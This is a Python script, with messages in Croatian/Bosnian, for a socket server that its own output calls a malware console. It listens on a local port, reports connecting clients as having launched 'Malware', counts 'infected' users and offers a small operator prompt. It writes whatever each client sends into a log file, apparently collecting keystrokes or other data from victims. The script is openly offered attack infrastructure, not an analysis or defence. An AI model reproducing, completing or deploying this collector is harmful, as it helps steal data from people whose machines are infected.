import socket
import threading
import keyboard
import os
from colorama import Fore

INFO = Fore.BLUE + "[" + Fore.YELLOW + "INFO" + Fore.BLUE + "] " + Fore.WHITE
ERROR = Fore.BLUE + "[" + Fore.YELLOW + "ERROR" + Fore.BLUE + "] " + Fore.RED
WARNING = Fore.BLUE + "[" + Fore.YELLOW + "WARNING" + Fore.BLUE + "] " + Fore.YELLOW


def start():
    with(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
        HOST = "127.0.0.1"
        PORT = 5050
        ONLINE = 0
        s.bind((HOST,PORT))
        print(f"{INFO} Server je pokrenut na {HOST}:{PORT}")
        s.listen(5)
        
        for i in range(1):
            (clientsocket, address) = s.accept()
            print(f"{WARNING} - "+"\033[1m"+f"{address}"+'\033[0m'+" je pokrenuo Malware!")
            print("")
            ONLINE += 1
            
            
        while True:
            if(keyboard.is_pressed('0')):
                while True:
                    komanda = str(input(Fore.WHITE + "krkan@root-$ "))
                    if(komanda == "!ONLINE" or komanda == "!online"):
                        print(f"{INFO} - Broj zaraženih "+"\033[1m"+f"{ONLINE}"+"\033[0m"+ " na Serveru!")
                        print("")
                    elif(komanda == "!KORISNICI" or komanda == "!korisnici"):
                            print(f'{INFO} - \033[1m'+f"{address}"+'\033[0m' +' - je trenutačno zaražen!')
                            print("")
                    elif(komanda == "!STOP" or komanda == "!stop"):
                        print(f"{INFO} Console je zagažena!")
                        print("")
                        break
                    elif(komanda == "!CLEAR" or komanda == "!clear"):
                        os.system('cls')
                        print(f"{INFO} - Console je očišćen!")
                        print("")
                    elif(komanda == "!DISCONNECT" or komanda == "!disconnect"):
                        print(f"{WARNING} - {address} je diskonektan sa Servera!")
                        s.close()
                        ONLINE -= 1
                    else:
                        print(f"{ERROR} - Oooopppss, nešto je pošlo po krivom!")
                        print("")
            data = clientsocket.recv(1024).decode()
            f = open("logovi.txt","a")
            f.write(f"{address} --> {data} \n")
            f.close()

start()
